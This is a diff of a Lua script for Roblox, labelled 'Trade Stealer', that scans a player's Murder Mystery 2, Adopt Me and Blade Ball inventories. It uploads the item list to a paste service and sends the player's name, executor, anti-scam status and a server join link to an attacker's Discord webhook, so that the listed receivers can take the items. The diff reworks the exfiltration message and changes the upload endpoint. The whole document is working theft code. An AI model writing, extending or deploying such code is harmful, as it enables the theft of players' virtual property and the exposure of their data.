@@ -5,8 +5,6 @@ local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 local HS = game:GetService("HttpService")
 
-local GODLY_PLUS = {Ancient=true, Godly=true, Chroma=true, Unique=true, Vintage=true}
-
 local function do_request(method, url, body, headers)
     return request({Url=url, Method=method, Body=body, Headers=headers or {}})
 end
@@ -40,13 +38,13 @@ local function collect_mm2_items()
     local ok2, Sync = pcall(function()
         return require(RS.Database.Sync)
     end)
-    local rarityOrder = {Unique=1,Ancient=2,Godly=3,Chroma=4,Vintage=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
+    local rarityOrder = {Ancient=1,Godly=2,Unique=3,Vintage=4,Chroma=5,Legendary=6,Rare=7,Uncommon=8,Common=9}
     for itemName, amount in pairs(ProfileData.Weapons.Owned) do
         local rarity = "Unknown"
         if ok2 and Sync and Sync.Weapons and Sync.Weapons[itemName] then
             rarity = Sync.Weapons[itemName].Rarity or "Unknown"
         end
-        table.insert(items, {name=itemName, id="", rarity=rarity, amount=tostring(amount)})
+        table.insert(items, {name=itemName, rarity=rarity, amount=tostring(amount)})
     end
     table.sort(items, function(a, b)
         return (rarityOrder[a.rarity] or 999) < (rarityOrder[b.rarity] or 999)
@@ -60,7 +58,7 @@ local function collect_adoptme_items()
     if inv then
         for _, v in ipairs(inv:GetDescendants()) do
             if v:IsA("StringValue") or v:IsA("IntValue") then
-                table.insert(items, {name=v.Name, id=tostring(v.Value), rarity="Pet", amount="1"})
+                table.insert(items, {name=v.Name, rarity="Pet", amount="1"})
             end
         end
     end
@@ -68,8 +66,8 @@ local function collect_adoptme_items()
 end
 
 local function post_rubis(text)
-    local ok, res = pcall(do_request, "POST", "https://rubis.io/api/paste",
-        HS:JSONEncode({content=text, title="MM2 Inventory"}),
+    local ok, res = pcall(do_request, "POST", "https://api.rubis.app/v2/scrap",
+        HS:JSONEncode({content=text}),
         {["Content-Type"]="application/json"})
     if not ok then return nil end
     local dok, data = pcall(function() return HS:JSONDecode(res.Body) end)
@@ -82,23 +80,16 @@ local function send_discord(items, game_name)
     local join = "https://fern.wtf/joiner?placeId="..tostring(PlaceId).."&gameInstanceId="..game.JobId
     local receivers = table.concat(CFG.allowed, ", ")
 
-    local top_lines, counts = {}, {}
+    local counts = {}
+    local order = {"Ancient","Godly","Unique","Vintage","Legendary","Rare","Uncommon","Common"}
     for _, it in ipairs(items) do
-        if GODLY_PLUS[it.rarity] then
-            table.insert(top_lines, it.name.." ("..it.rarity..")")
-        else
-            counts[it.rarity] = (counts[it.rarity] or 0) + 1
-        end
-    end
-    local count_lines = {}
-    for _, r in ipairs({"Legendary","Rare","Uncommon","Common","Unknown"}) do
-        if counts[r] then table.insert(count_lines, r..": "..counts[r]) end
+        counts[it.rarity] = (counts[it.rarity] or 0) + 1
     end
 
-    local inv_display = ""
-    if #top_lines > 0 then inv_display = table.concat(top_lines, "\n").."\n" end
-    if #count_lines > 0 then inv_display = inv_display..table.concat(count_lines, "\n") end
-    if inv_display == "" then inv_display = "None" end
+    local inv_lines = {}
+    for _, r in ipairs(order) do
+        table.insert(inv_lines, string.format("%-10s: %d", r, counts[r] or 0))
+    end
 
     local full_text = {}
     for _, it in ipairs(items) do
@@ -106,21 +97,18 @@ local function send_discord(items, game_name)
     end
     local rubis_url = post_rubis(table.concat(full_text, "\n")) or "upload mislukt"
 
+    local desc = string.format(
+        "**Player Info:**\n```\nUsername:    %s\nDisplay:     %s\nExecutor:    %s\nAntiscam:    %s\nRoblox ver:  %s\nReceiver:    %s\n```\n\n**Inventory**\n```\n%s\n```\n\n**List of items:** %s\n\n**Join link:** [click here to join](%s)",
+        lp.Name, lp.DisplayName, get_executor(), tostring(detect_antiscam()), get_roblox_version(),
+        receivers, table.concat(inv_lines, "\n"), rubis_url, join
+    )
+
     local embed = {
         username = "Trade Stealer",
         embeds = {{
-            title = game_name.." Stealer",
-            color = 15158332,
-            fields = {
-                {name="Username",  value=lp.Name,                    inline=true},
-                {name="Display",   value=lp.DisplayName,              inline=true},
-                {name="Executor",  value=get_executor(),              inline=true},
-                {name="Antiscam",  value=tostring(detect_antiscam()), inline=true},
-                {name="Receiver",  value=receivers,                   inline=true},
-                {name="Inventory", value=inv_display,                 inline=false},
-                {name="Full list", value=rubis_url,                   inline=false},
-                {name="Join Link", value="[Click here]("..join..")",  inline=false},
-            },
+            title       = game_name.." Stealer",
+            description = desc,
+            color       = 15158332,
         }}
     }
     pcall(do_request, "POST", CFG.webhook, HS:JSONEncode(embed), {["Content-Type"]="application/json"})
@@ -194,7 +182,7 @@ local function hook_bladeball()
     local mgp = lp:FindFirstChild("leaderstats")
     if mgp then
         for _, v in ipairs(mgp:GetChildren()) do
-            table.insert(items, {name=v.Name, id="", rarity=tostring(v.Value), amount="1"})
+            table.insert(items, {name=v.Name, rarity=tostring(v.Value), amount="1"})
         end
     end
     send_job("BladeBall", items)
